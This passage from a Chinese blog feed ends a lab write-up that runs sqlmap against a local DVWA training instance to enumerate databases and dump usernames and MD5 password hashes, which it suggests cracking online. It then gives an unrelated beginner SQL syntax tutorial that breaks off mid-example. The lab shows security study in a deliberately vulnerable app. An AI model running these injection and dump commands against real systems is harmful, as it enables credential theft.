<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> --dbs</span><br></pre></td></tr></table></figure>

<p>列举数据库名称有：<code>dvwa</code>、<code>information_schema</code>、<code>mysql</code>、<code>owasp10</code>、<code>wackopicko</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862837386.png" alt="1565862837386"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862843842.png" alt="1565862843842"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> -D dvwa –tables </span><br></pre></td></tr></table></figure>

<p>选择其中的<code>dvwa</code>库查看表信息,发现有两个表，分别是：<code>guestbook</code>和<code>users</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862931713.png" alt="1565862931713"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565862940712.png" alt="1565862940712"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>

<p>选择<code>users</code>表，查看表中的列</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863006027.png" alt="1565863006027"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863010978.png" alt="1565863010978"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure>

<p>选择其中的<code>user</code>，<code>password</code>进行查看，可得到全部用户名和密码,其中密码为<code>md5</code>加密，可以通过解码网站破解</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863074071.png" alt="1565863074071"></p>
</li>
</ol>
<h3 id="安全级别中级-1"><a href="#安全级别中级-1" class="headerlink" title="安全级别中级"></a>安全级别中级</h3><ol>
<li><p>进行安全级别设置</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863222560.png" alt="1565863222560"></p>
</li>
<li><p>在SQLMAP目标url带上cookie重新尝试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87 057104&quot;</span></span><br></pre></td></tr></table></figure>

<p>注入成功</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863427938.png" alt="1565863427938"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863433020.png" alt="1565863433020"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> --dbs</span><br></pre></td></tr></table></figure>

<p>列举数据库名称有：<code>dvwa</code>、<code>information_schema</code>、<code>mysql</code>、<code>owasp10</code>、<code>wackopicko</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863487711.png" alt="1565863487711"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863498957.png" alt="1565863498957"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/ vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> -D dvwa --tables</span><br></pre></td></tr></table></figure>

<p> 选择其中的<code>dvwa</code>库查看表信息,发现有两个表，分别是：<code>guestbook</code>和<code>users</code></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863540630.png" alt="1565863540630"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863544746.png" alt="1565863544746"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -<span class="string">u&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> -D dvwa -T users --columns</span><br></pre></td></tr></table></figure>

<p>选择<code>users</code>表，查看表中的列</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863584752.png" alt="1565863584752"></p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863588715.png" alt="1565863588715"></p>
</li>
<li><p>在命令行中输入：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u <span class="string">&quot;http://192.168.88.149/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> --cookie=<span class="string">&quot;security=low;PHPSESSID=ok7714gv32gkn2rvdh87057104&quot;</span> -D dvwa -T users -C user,password --dump</span><br></pre></td></tr></table></figure>

<p>选择其中的<code>user</code>，<code>password</code>进行查看，可得到全部用户名和密码,其中密码为<code>md5</code>加密，可以通过解码网站破解</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565863634151.png" alt="1565863634151"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件安全实验</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
      </tags>
  </entry>
  <entry>
    <title>SQL入门语法总结</title>
    <url>/SQL%E5%85%A5%E9%97%A8%E8%AF%AD%E6%B3%95%E6%80%BB%E7%BB%93.html</url>
    <content><![CDATA[<h1 id="SQL介绍"><a href="#SQL介绍" class="headerlink" title="SQL介绍"></a>SQL介绍</h1><ul>
<li>  结构化查询语言。<span id="more"></span></li>
<li>  RDBMS 指关系型数据库管理系统，全称 Relational Database Management System。</li>
<li>  RDBMS 是 SQL 的基础，同样也是所有现代数据库系统的基础，比如 MS SQL Server、IBM DB2、Oracle、MySQL 以及 Microsoft Access。</li>
<li>  RDBMS 中的数据存储在被称为表的数据库对象中。</li>
<li>  表是相关的数据项的集合，它由列和行组成。</li>
</ul>
<h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="展示、创建、使用数据库"><a href="#展示、创建、使用数据库" class="headerlink" title="展示、创建、使用数据库"></a>展示、创建、使用数据库</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;	#展示数据库</span><br><span class="line">create DATABASE dbname;	#创建数据库dbname</span><br><span class="line">use dbname;	#使用数据库dbname</span><br></pre></td></tr></table></figure>

<h3 id="展示、创建数据表"><a href="#展示、创建数据表" class="headerlink" title="展示、创建数据表"></a>展示、创建数据表</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show tables;	#展示数据库中的所有数据表</span><br><span class="line">#创建数据表table_name</span><br><span class="line">CREATE TABLE table_name</span><br><span class="line">(</span><br><span class="line">column_name1 data_type(size),</span><br><span class="line">column_name2 data_type(size),</span><br><span class="line">column_name3 data_type(size),</span><br><span class="line">....</span><br><span class="line">);</span><br><span class="line"># column_name 参数规定表中列的名称</span><br><span class="line"># data_type 参数规定列的数据类型（例如 varchar、integer、decimal、date 等等）</span><br><span class="line"># size 参数规定表中列的最大长度</span><br></pre></td></tr></table></figure>

<h3 id="重要的SQL命令"><a href="#重要的SQL命令" class="headerlink" title="重要的SQL命令"></a>重要的SQL命令</h3><ul>
<li>  <strong>SELECT</strong> - 从数据库中提取数据</li>
<li>  <strong>UPDATE</strong> - 更新数据库中的数据</li>
<li>  <strong>DELETE</strong> - 从数据库中删除数据</li>
<li>  <strong>INSERT INTO</strong> - 向数据库中插入新数据</li>
<li>  <strong>CREATE DATABASE</strong> - 创建新数据库</li>
<li>  <strong>ALTER DATABASE</strong> - 修改数据库</li>
<li>  <strong>CREATE TABLE</strong> - 创建新表</li>
<li>  <strong>ALTER TABLE</strong> - 变更（改变）数据库表</li>
<li>  <strong>DROP TABLE</strong> - 删除表</li>
<li>  <strong>CREATE INDEX</strong> - 创建索引（搜索键）</li>
<li>  <strong>DROP INDEX</strong> - 删除索引</li>
</ul>
<h3 id="SELECT语句"><a href="#SELECT语句" class="headerlink" title="SELECT语句"></a><strong>SELECT语句</strong></h3><p>——用于从数据库中选取数据。</p>
<p>结果被存储在一个结果表中，称为结果集。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name,column_name </span><br><span class="line">	FROM table_name;</span><br><span class="line">#or</span><br><span class="line">SELECT * FROM table_name;</span><br></pre></td></tr></table></figure>

<h3 id="SELECT-DISTINCT-语句"><a href="#SELECT-DISTINCT-语句" class="headerlink" title="SELECT DISTINCT 语句"></a><strong>SELECT DISTINCT 语句</strong></h3><p>——用于返回唯一不同的值。</p>
<p>将重复的列变为一列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT DISTINCT column_name,column_name</span><br><span class="line">	FROM table_name;</span><br></pre></td></tr></table></figure>

<h3 id="WHERE子句"><a href="#WHERE子句" class="headerlink" title="WHERE子句"></a><strong>WHERE子句</strong></h3><p>——用于过滤记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name,column_name</span><br><span class="line">	FROM table_name</span><br><span class="line">	WHERE column_name operator value;</span><br><span class="line"># example</span><br><span class="line">SELECT * FROM Websites WHERE country='CN';</span><br><span class="line">SELECT * FROM Websites WHERE id=1;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>WHERE子句中的运算符</p>
<table>
<thead>
<tr>
<th align="left">运算符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">=</td>
<td align="left">等于</td>
</tr>
<tr>
<td align="left">&lt;&gt;</td>
<td align="left">不等于，在 SQL 的一些版本中，该操作符可被写成 !=</td>
</tr>
<tr>
<td align="left">&gt;</td>
<td align="left">大于</td>
</tr>
<tr>
<td align="left">&lt;</td>
<td align="left">小于</td>
</tr>
<tr>
<td align="left">&gt;=</td>
<td align="left">大于等于</td>
</tr>
<tr>
<td align="left">&lt;=</td>
<td align="left">小于等于</td>
</tr>
<tr>
<td align="left">BETWEEN</td>
<td align="left">在某个范围内</td>
</tr>
<tr>
<td align="left">LIKE</td>
<td align="left">搜索某种模式</td>
</tr>
<tr>
<td align="left">IN</td>
<td align="left">指定针对某个列的多个可能值</td>
</tr>
</tbody></table>
</li>
<li><p>WHERE子句也可以用AND OR NOT逻辑</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 优先级 ()&gt;not&gt;and&gt;or</span><br><span class="line">Select * from emp where sal &gt; 2000 and sal &lt; 3000;</span><br><span class="line">Select * from emp where sal &gt; 2000 or comm &gt; 500;</span><br><span class="line">select * from emp where not sal &gt; 1500;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="AND-amp-OR-运算符"><a href="#AND-amp-OR-运算符" class="headerlink" title="AND & OR 运算符"></a><strong>AND &amp; OR 运算符</strong></h3><p>——用于基于一个以上的条件对记录进行过滤</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT * FROM Websites</span><br><span class="line">	WHERE country='CN'</span><br><span class="line">	AND alexa &gt; 50;</span><br><span class="line">	</span><br><span class="line">SELECT * FROM Websites</span><br><span class="line">	WHERE country='USA'</span><br><span class="line">	OR country='CN';</span><br><span class="line"></span><br><span class="line">SELECT * FROM Websites</span><br><span class="line">	WHERE alexa &gt; 15</span><br><span class="line">	AND (country='CN' OR country='USA');</span><br></pre></td></tr></table></figure>

<h3 id="ORDER-BY-关键字"><a href="#ORDER-BY-关键字" class="headerlink" title="ORDER BY 关键字"></a><strong>ORDER BY 关键字</strong></h3><p>——用于对结果集进行排序</p>
<p>ORDER BY 关键字默认按照<strong>升序</strong>对记录进行排序。如果需要按照<strong>降序</strong>对记录进行排序，可以使用 DESC 关键字；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name,column_name</span><br><span class="line">	FROM table_name</span><br><span class="line">	ORDER BY column_name,column_name ASC|DESC;</span><br><span class="line"># ORDER BY 多列的时候，先按照第一个column name排序，再按照第二个column name排序</span><br></pre></td></tr></table></figure>

<h3 id="INSERT-INTO-语句"><a href="#INSERT-INTO-语句" class="headerlink" title="INSERT INTO 语句"></a><strong>INSERT INTO 语句</strong></h3><p>——用于向表中插入新记录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#1 无需指定要插入数据的列名，只需提供被插入的值即可,但是需要列出插入行的每一列数据</span><br><span class="line">INSERT INTO table_name</span><br><span class="line">	VALUES (value1,value2,value3,...);</span><br><span class="line">#2 需要指定列名及被插入的值</span><br><span class="line">INSERT INTO table_name (column1,column2,column3,...)</span><br><span class="line">	VALUES (value1,value2,value3,...);</span><br></pre></td></tr></table></figure>

<p>insert into select 和select into from 的区别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">insert into scorebak select * from socre where neza='neza'   #插入一行,要求表scorebak 必须存在</span><br><span class="line">select *  into scorebak from score  where neza='neza'  #也是插入一行,要求表scorebak 不存在</span><br></pre></td></tr></table></figure>

<h3 id="UPDATE-语句"><a href="#UPDATE-语句" class="headerlink" title="UPDATE 语句"></a><strong>UPDATE 语句</strong></h3><p>——用于更新表中的记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line">	SET column1=value1,column2=value2,...</span><br><span class="line">	WHERE some_column=some_value;	#WHERE 子句规定哪条记录or者哪些记录需要更新。如果省略了WHERE子句，所有的记录都将被更新！</span><br></pre></td></tr></table></figure>

<h3 id="DELETE-语句"><a href="#DELETE-语句" class="headerlink" title="DELETE 语句"></a><strong>DELETE 语句</strong></h3><p>——用于删除表中的记录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DELETE FROM table_name</span><br><span class="line">	WHERE some_column=some_value;</span><br><span class="line"># 在不删除表的情况下，删除表中所有的行，即表结构、属性、索引将保持不变</span><br><span class="line">DELETE FROM table_name;</span><br><span class="line">	# or</span><br><span class="line">DELETE * FROM table_name;</span><br></pre></td></tr></table></figure>

<h2 id="高级语法"><a href="#高级语法" class="headerlink" title="高级语法"></a>高级语法</h2><h3 id="SELECT-TOP-LIMIT-ROWNUM-子句"><a href="#SELECT-TOP-LIMIT-ROWNUM-子句" class="headerlink" title="SELECT TOP, LIMIT, ROWNUM 子句"></a><strong>SELECT TOP, LIMIT, ROWNUM 子句</strong></h3><p>SELECT TOP 子句用于规定要返回的记录的数目，对于拥有数千条记录的大型表来说，是非常有用的。</p>
<p>**注意:**并非所有的数据库系统都支持 SELECT TOP 语句。 MySQL 支持 LIMIT 语句来选取指定的条数数据， Oracle 可以使用 ROWNUM 来选取。</p>
<ul>
<li><p>SQL Server / MS Access 语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT TOP number|percent column_name(s)</span><br><span class="line">	FROM table_name;</span><br><span class="line"># example</span><br><span class="line"># 前5行数据</span><br><span class="line">select top 5 * from table</span><br><span class="line"># 后5行数据</span><br><span class="line">select top 5 * from table order by id desc  # --desc 表示降序排列 asc 表示升序</span><br></pre></td></tr></table></figure></li>
<li><p>Myslq 语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">	FROM table_name</span><br><span class="line">	LIMIT number;</span><br><span class="line"># example</span><br><span class="line">SELECT * FROM Websites LIMIT 2;	# 从 "Websites" 表中选取头两条记录</span><br></pre></td></tr></table></figure></li>
<li><p>Oracle 语法</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">	FROM table_name</span><br><span class="line">	WHERE ROWNUM &lt;= number;</span><br></pre></td></tr></table></figure></li>
<li><p>SQL SELECT TOP PERCENT 实例</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Microsoft SQL Server 数据库中，从 websites 表中选取前面百分之 50 的记录</span><br><span class="line">SELECT TOP 50 PERCENT * FROM Websites;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="LIKE-操作符——用于在-WHERE-子句中搜索列中的指定模式"><a href="#LIKE-操作符——用于在-WHERE-子句中搜索列中的指定模式" class="headerlink" title="LIKE 操作符——用于在 WHERE 子句中搜索列中的指定模式"></a><strong>LIKE 操作符</strong>——用于在 WHERE 子句中搜索列中的指定模式</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">	FROM table_name</span><br><span class="line">	WHERE column_name LIKE pattern;</span><br></pre></td></tr></table></figure>

<h3 id="SQL-通配符——用于替代字符串中的任何其他字符"><a href="#SQL-通配符——用于替代字符串中的任何其他字符" class="headerlink" title="SQL 通配符——用于替代字符串中的任何其他字符"></a><strong>SQL 通配符</strong>——用于替代字符串中的任何其他字符</h3><p>在 SQL 中，通配符与 SQL LIKE 操作符一起使用，用于搜索表中的数据。</p>
<table>
<thead>
<tr>
<th align="left">通配符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%</td>
<td align="left">替代 0 个or多个字符</td>
</tr>
<tr>
<td align="left">_</td>
<td align="left">替代一个字符</td>
</tr>
<tr>
<td align="left">[charlist]</td>
<td align="left">字符列中的任何单一字符</td>
</tr>
<tr>
<td align="left">[^charlist] or [!charlist]</td>
<td align="left">不在字符列中的任何单一字符</td>
</tr>
</tbody></table>
<ul>
<li><p>使用 SQL [charlist] 通配符</p>
<p>  MySQL 中使用 <strong>REGEXP</strong> or <strong>NOT REGEXP</strong> 运算符 (or RLIKE 和 NOT RLIKE) 来操作正则表达式。</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 选取 name 以 "G"、"F" or "s" 开始的所有网站</span><br><span class="line">SELECT * FROM Websites</span><br><span class="line">	WHERE name REGEXP '^[GFs]';</span><br><span class="line"># 选取 name 以 A 到 H 字母开头的网站</span><br><span class="line">SELECT * FROM Websites</span><br><span class="line">	WHERE name REGEXP '^[A-H]';</span><br><span class="line"># 选取 name 不以 A 到 H 字母开头的网站</span><br><span class="line">SELECT * FROM Websites</span><br><span class="line">	WHERE name REGEXP '^[^A-H]';</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="IN-操作符"><a href="#IN-操作符" class="headerlink" title="IN 操作符"></a><strong>IN 操作符</strong></h3><p>——允许在 WHERE 子句中规定多个值</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">	FROM table_name</span><br><span class="line">	WHERE column_name IN (value1,value2,...);</span><br></pre></td></tr></table></figure>

<h3 id="BETWEEN-操作符"><a href="#BETWEEN-操作符" class="headerlink" title="BETWEEN 操作符"></a><strong>BETWEEN 操作符</strong></h3><p>——用于选取介于两个值之间的数据范围内的值，可以是数值、文本、日期等</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">	FROM table_name</span><br><span class="line">	WHERE column_name BETWEEN value1 AND value2;	#	如果是字符串or者日期，需要用单引号括起来</span><br></pre></td></tr></table></figure>

<h3 id="别名"><a href="#别名" class="headerlink" title="别名"></a><strong>别名</strong></h3><p>——为表名称or列名称指定别名。</p>
<p>基本上，创建别名是为了让列名称的可读性更强。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 列的SQL别名语法</span><br><span class="line">SELECT column_name AS alias_name	#如果列名称包含空格，要求使用双引号or方括号</span><br><span class="line">	FROM table_name;</span><br><span class="line"># 表的SQL别名语法</span><br><span class="line">SELECT column_name(s)</span><br><span class="line">	FROM table_name AS alias_name;</span><br><span class="line"># 把三个列合并成一个新列</span><br><span class="line">SELECT name, CONCAT(column1, ', ', column2, ', ', column3) AS new_cloumn</span><br><span class="line">	FROM table_name;</span><br></pre></td></tr></table></figure>

<p>在下面的情况下，使用别名很有用：</p>
<ul>
<li>  在查询中涉及超过一个表</li>
<li>  在查询中使用了函数</li>
<li>  列名称很长or者可读性差</li>
<li>  需要把两个列or者多个列结合在一起</li>
</ul>
<h3 id="连接-JOIN"><a href="#连接-JOIN" class="headerlink" title="连接(JOIN)"></a><strong>连接(JOIN)</strong></h3><p>——用于把来自两个or多个表的行结合起来</p>
<p>JOIN相关的七种用法</p>
<ul>
<li>  INNER JOIN（内连接）</li>
<li>  LEFT JOIN（左连接）</li>
<li>  RIGHT JOIN（右连接）</li>
<li>  OUTER JOIN（外连接）（mysql数据库不支持）</li>
<li>  LEFT JOIN EXCLUDING INNER JOIN（左连接-内连接）</li>
<li>  RIGHT JOIN EXCLUDING INNER JOIN（右连接-内连接）</li>
<li>  OUTER JOIN EXCLUDING INNER JOIN（外连接-内连接）</li>
</ul>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200929225450.png"></p>
<ol>
<li><p><strong>INNER JOIN 关键字</strong></p>
<p> ——关键字在表中存在至少一个匹配时返回行</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">  FROM table1</span><br><span class="line">  INNER JOIN table2</span><br><span class="line">  ON table1.column_name=table2.column_name;</span><br><span class="line"># or</span><br><span class="line">SELECT column_name(s)</span><br><span class="line">  FROM table1</span><br><span class="line">  JOIN table2</span><br><span class="line">  ON table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>LEFT JOIN 关键字</strong></p>
<p> ——从左表（table1）返回所有的行，如果右表（table2）中没有匹配，则结果为 NULL。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">  FROM table1</span><br><span class="line">  LEFT JOIN table2</span><br><span class="line">  ON table1.column_name=table2.column_name;</span><br><span class="line">#or </span><br><span class="line">SELECT column_name(s)</span><br><span class="line">  FROM table1</span><br><span class="line">  LEFT OUTER JOIN table2</span><br><span class="line">  ON table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>RIGHT JOIN 关键字</strong></p>
<p> ——从右表（table2）返回所有的行，如果左表（table1）中没有匹配，则结果为 NULL。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">  FROM table1</span><br><span class="line">  RIGHT JOIN table2</span><br><span class="line">  ON table1.column_name=table2.column_name;</span><br><span class="line">#or </span><br><span class="line">SELECT column_name(s)</span><br><span class="line">  FROM table1</span><br><span class="line">  RIGHT OUTER JOIN table2</span><br><span class="line">  ON table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure></li>
<li><p><strong>FULL OUTER JOIN 关键字</strong></p>
<p> ——只要左表（table1）和右表（table2）其中一个表中存在匹配，则返回行。</p>
<p> MySQL中不支持 FULL OUTER JOIN</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s)</span><br><span class="line">  FROM table1</span><br><span class="line">  FULL OUTER JOIN table2</span><br><span class="line">  ON table1.column_name=table2.column_name;</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="UNION-操作符"><a href="#UNION-操作符" class="headerlink" title="UNION 操作符"></a><strong>UNION 操作符</strong></h3><p>——合并两个or多个 SELECT 语句的结果</p>
<p>注意，</p>
<ul>
<li>  UNION 内部的每个 SELECT 语句必须拥有相同数量的列；</li>
<li>  列也必须拥有相似的数据类型；</li>
<li>  每个 SELECT 语句中的列的顺序必须相同；</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT column_name(s) FROM table1</span><br><span class="line">UNION</span><br><span class="line">SELECT column_name(s) FROM table2;</span><br><span class="line"># 默认地，UNION 操作符选取不同的值。如果允许重复的值，请使用 UNION ALL。</span><br><span class="line">SELECT column_name(s) FROM table1</span><br><span class="line">UNION ALL</span><br><span class="line">SELECT column_name(s) FROM table2;</span><br></pre></td></tr></table></figure>

<h3 id="SELECT-INTO-语句"><a href="#SELECT-INTO-语句" class="headerlink" title="SELECT INTO 语句"></a><strong>SELECT INTO 语句</strong></h3><p>——从一个表复制数据，然后把数据插入到另一个新表中</p>
<p>MySQL 数据库不支持 <code>SELECT ... INTO</code> 语句，但支持 <code>INSERT INTO ... SELECT</code> </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 复制所有的列插入到新表中</span><br><span class="line">SELECT *</span><br><span class="line">INTO newtable [IN externaldb]</span><br><span class="line">FROM table1;</span><br><span class="line"># 只复制希望的列插入到新表中</span><br><span class="line">SELECT column_name(s)</span><br><span class="line">INTO newtable [IN externaldb]</span><br><span class="line">FROM table1;</span><br><span class="line"># 创建一个新的空表</span><br><span class="line">SELECT *</span><br><span class="line">INTO newtable</span><br><span class="line">FROM table1</span><br><span class="line">WHERE 1=0;</span><br></pre></td></tr></table></figure>

<h3 id="INSERT-INTO-SELECT-语句"><a href="#INSERT-INTO-SELECT-语句" class="headerlink" title="INSERT INTO SELECT 语句"></a><strong>INSERT INTO SELECT 语句</strong></h3><p>——从一个表复制数据，插入到一个已存在的表中。目标表中任何已存在的行都不会受影响。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 从一个表中复制所有的列插入到另一个已存在的表中</span><br><span class="line">INSERT INTO table2</span><br><span class="line">SELECT * FROM table1;</span><br><span class="line"># 只复制希望的列插入到另一个已存在的表中</span><br><span class="line">INSERT INTO table2</span><br><span class="line">(column_name(s))</span><br><span class="line">SELECT column_name(s)</span><br><span class="line">FROM table1;</span><br></pre></td></tr></table></figure>

<h3 id="约束（Constraints）"><a href="#约束（Constraints）" class="headerlink" title="约束（Constraints）"></a><strong>约束（Constraints）</strong></h3><p>——用于规定表中的数据规则。</p>
<p>如果存在违反约束的数据行为，行为会被约束终止。</p>
<p>约束可以在创建表时规定（通过 CREATE TABLE 语句），或者在表创建之后规定（通过 ALTER TABLE 语句）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE TABLE table_name</span><br><span class="line">(</span><br><span class="line">column_name1 data_type(size) constraint_name,</span><br><span class="line">column_name2 data_type(size) constraint_name,</span><br><span class="line">column_name3 data_type(size) constraint_name,</span><br><span class="line">....</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>在 SQL 中，有如下约束：</p>
<ol>
<li><p><strong>NOT NULL</strong> - 指示某列不能存储 NULL 值。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建表时约束</span><br><span class="line">CREATE TABLE Persons (</span><br><span class="line">    ID int NOT NULL,</span><br><span class="line">    LastName varchar(255) NOT NULL,</span><br><span class="line">    FirstName varchar(255) NOT NULL,</span><br><span class="line">    Age int</span><br><span class="line">);</span><br><span class="line"># 对存在的表添加约束</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">MODIFY Age int NOT NULL;</span><br><span class="line"># 删除表中的约束</span><br><span class="line">ALTER TABLE Persons</span><br><span class="line">MODIFY Age int NULL;</span><br></pre></td></tr></table></figure>

</li>
<li><p><strong>UNIQUE</strong> - 保证某列的每行必须有唯一的值。</p>
<p> UNIQUE 和 PRIMARY KEY 约束均为列或列集合提供了唯一性的保证。</p>
<p> PRIMARY KEY 约束拥有自动定义的 UNIQUE 约束。</p>
<p> 每个表可以有多个 UNIQUE 约束，但是每个表只能有一个 PRIMARY KEY 约束。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># mysql</span><br><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int NOT NULL,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255),</span><br><span class="line">UNIQUE (P_Id)</span><br><span class="line">)</span><br><span class="line"># SQL Server / Oracle / MS Access</span><br><span class="line">CREATE TABLE Persons</span><br><span class="line">(</span><br><span class="line">P_Id int NOT NULL UNIQUE,</span><br><span class="line">LastName varchar(255) NOT NULL,</span><br><span class="line">FirstName varchar(255),</span><br><span class="line">Address varchar(255),</span><br><span class="line">City varchar(255)</span><br><span class="line">)</span><br><span class="line"># MySQL / SQL Server / Oracle / MS Access定义多列约束</span><br><span 